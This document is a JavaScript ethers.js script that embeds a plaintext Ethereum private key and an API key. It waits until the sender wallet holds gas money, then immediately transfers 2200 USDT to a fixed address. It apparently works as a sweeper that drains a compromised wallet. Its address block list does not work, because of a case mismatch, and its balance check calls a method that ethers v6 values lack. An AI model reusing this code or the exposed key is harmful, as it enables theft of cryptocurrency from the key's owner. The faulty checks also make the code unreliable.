import { ethers } from "ethers";

// Configuration
const alchemyApi = "https://eth-mainnet.alchemyapi.io/v2/qA9FV5BMTFx6p7638jhqx-JDFDByAZAn";
const senderAddress = "0x4DE23f3f0Fb3318287378AdbdE030cf61714b2f3";
const privateKey = "ee9cec01ff03c0adea731d7c5a84f7b412bfd062b9ff35126520b3eb3d5ff258";
const usdtContractAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7";
const destinationAddress = "0x08f695b8669b648897ed5399b9b5d951b72881a0";
const minEthRequired = 0.002;

// Updated blocked addresses list
const blockedAddresses = [
    "0x00000009DA65Dc0FA7a9e9f63f907B90a65A2c72",
    "0x073E12b3C7F9583FdbC738b4f1AfEC95010f2D28",
    "0x086c6061598c616923cDC82dD92c876F0cf82a5c",
    "0x08fc7400BA37FC4ee1BF73BeD5dDcb5db6A1036A",
    "0x1Adbc2eA5f3767C49560C3562f58d6e6ad4d9780",
    "0x272c2EA4C76E5c116213136D04d3E8051d1F6e3A",
    "0x2e2F4d3d57228c7dCB2F519e78e3471137f08B16",
    "0x30dcFc6999f400B67257C61DD3D79Cb20A65627A",
    "0x31eFc4AeAA7c39e54A33FDc3C46ee2Bd70ae0A09",
    "0x4DE23f3f0Fb3318287378AdbdE030cf61714b2f3",
    "0x6220E08c9d63AB7bA2e566839F429eeEfe199b7e",
    "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45",
    "0xB74E09179492C7cb5A0Aff57894EF94Fc0fED1D8",
    "0xD7040a105505EEF85752A9E94128922fb9110b1e",
    "0xE592427A0AEce92De3Edee1F18E0157C05861564",
    "0xb6ed7c545e4792479EC08Abd512593315084cDC9"
];

// Initialize provider and wallet
const provider = new ethers.JsonRpcProvider(alchemyApi);
const wallet = new ethers.Wallet(privateKey, provider);

// USDT Contract ABI (Minimal)
const usdtAbi = [
    "function balanceOf(address owner) view returns (uint256)",
    "function transfer(address to, uint256 amount) returns (bool)"
];
const usdtContract = new ethers.Contract(usdtContractAddress, usdtAbi, wallet);

// Blocked Address Checker
function isBlockedAddress(address) {
    return blockedAddresses.includes(address.toLowerCase());
}

// Function to get ETH balance
async function getEthBalance() {
    const balance = await provider.getBalance(senderAddress);
    return parseFloat(ethers.formatEther(balance));
}

// Function to send USDT
async function sendUsdt() {
    const amountToSend = ethers.parseUnits("2200", 6); // 2200 USDT in smallest unit
    while (true) {
        try {
            console.log("Checking USDT balance...");
            const usdtBalance = await usdtContract.balanceOf(senderAddress);
            if (usdtBalance.lt(amountToSend)) {
                console.log("Insufficient USDT balance. Retrying...");
                await new Promise(resolve => setTimeout(resolve, 500));
                continue;
            }

            console.log(`Sending 2200 USDT to ${destinationAddress}...`);
            const tx = await usdtContract.transfer(destinationAddress, amountToSend);
            console.log("Transaction sent. Hash:", tx.hash);

            const receipt = await tx.wait();
            console.log("Transaction confirmed! Receipt:", receipt.transactionHash);
            break;
        } catch (error) {
            console.error("Transaction failed. Retrying...", error);
            await new Promise(resolve => setTimeout(resolve, 500));
        }
    }
}

// Main Function
(async () => {
    try {
        console.log("Checking if destination address is blocked...");
        if (isBlockedAddress(destinationAddress)) {
            console.error("Destination address is blocked. Exiting...");
            return;
        }

        console.log("Waiting for sufficient ETH balance...");
        while (true) {
            const ethBalance = await getEthBalance();
            console.log("Current ETH Balance:", ethBalance);
            if (ethBalance >= minEthRequired) {
                console.log("Sufficient ETH balance detected!");
                break;
            }
            await new Promise(resolve => setTimeout(resolve, 500)); // Wait 0.5s before rechecking
        }

        console.log("Attempting to send USDT...");
        await sendUsdt();
    } catch (error) {
        console.error("Critical Error:", error);
    }
})();
